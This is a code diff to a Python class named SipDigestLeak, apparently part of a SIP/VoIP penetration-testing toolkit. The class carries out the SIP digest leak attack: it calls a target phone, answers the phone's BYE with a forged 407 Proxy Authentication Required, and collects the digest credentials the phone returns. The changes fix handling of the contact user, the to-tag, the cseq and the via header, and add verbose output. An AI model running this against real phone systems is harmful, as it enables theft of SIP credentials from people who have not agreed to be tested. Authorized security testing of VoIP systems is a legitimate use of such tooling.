@@ -184,8 +184,6 @@ class SipDigestLeak:
                 else:
                     sock.sendto(bytes(msg[:8192], 'utf-8'), host)
 
-                # auth_type == 1
-
                 if headers['auth'] != '':
                     auth = headers['auth']
                     auth_type = headers['auth-type']
@@ -262,15 +260,21 @@ class SipDigestLeak:
 
             # receive 200 Ok - call answered
             if headers['response_code'] == '200':
+                cuser = headers['contactuser']
                 cdomain = headers['contactdomain']
                 if cdomain == '':
                     cdomain = self.domain
+                else:
+                    if cuser != None and cuser != '':
+                        cdomain = cuser + '@' + cdomain
+
+                totag = headers['totag']
 
                 # send ACK
                 print(YELLOW + '[=>] Request ACK')
 
                 msg = create_message('ACK', self.contact_domain, self.from_user, self.from_name, self.from_domain,
-                                     self.to_user, self.to_name, self.to_domain, proto, cdomain, self.user_agent, lport, branch, callid, tag, cseq, totag, '', 1, '', 0, via, rr)
+                                     self.to_user, self.to_name, self.to_domain, proto, cdomain, self.user_agent, lport, branch, callid, tag, cseq, totag, digest, auth_type, '', 0, via, rr)
 
                 if self.verbose == 1:
                     print(BWHITE + '[+] Sending to %s:%s/%s ...' %
@@ -297,6 +301,8 @@ class SipDigestLeak:
                         print(CYAN + '[<=] Received BYE')
                         headers = parse_message(resp.decode())
                         branch = headers['branch']
+                        cseq = headers['cseq']
+                        via = headers['via']
                     else:
                         print(CYAN + '[<=] Response %s' % response)
 
@@ -308,10 +314,15 @@ class SipDigestLeak:
                 # send 407 with digest
                 cseq = int(cseq) + 1
                 msg = create_response_error('407 Proxy Authentication Required', self.from_user,
-                                            self.to_user, proto, self.domain, lport, cseq, 'BYE', branch, callid, tag, totag, local_ip)
+                                            self.to_user, proto, self.domain, lport, cseq, 'BYE', branch, callid, tag, totag, local_ip, via)
 
                 print(
                     YELLOW + '[=>] Request 407 Proxy Authentication Required')
+
+                if self.verbose == 1:
+                    print(BWHITE + '[+] Sending to %s:%s/%s ...' %
+                          (self.ip, self.rport, self.proto))
+                    print(YELLOW + msg + WHITE)
 
                 if self.proto == 'TLS':
                     sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
@@ -337,7 +348,7 @@ class SipDigestLeak:
 
                 # send 200 OK
                 msg = create_response_ok(
-                    self.from_user, self.to_user, proto, self.domain, lport, cseq, branch, callid, tag, totag,)
+                    self.from_user, self.to_user, proto, self.domain, lport, cseq, branch, callid, tag, totag, '')
 
                 print(YELLOW + '[=>] Request 200 Ok\n')
 
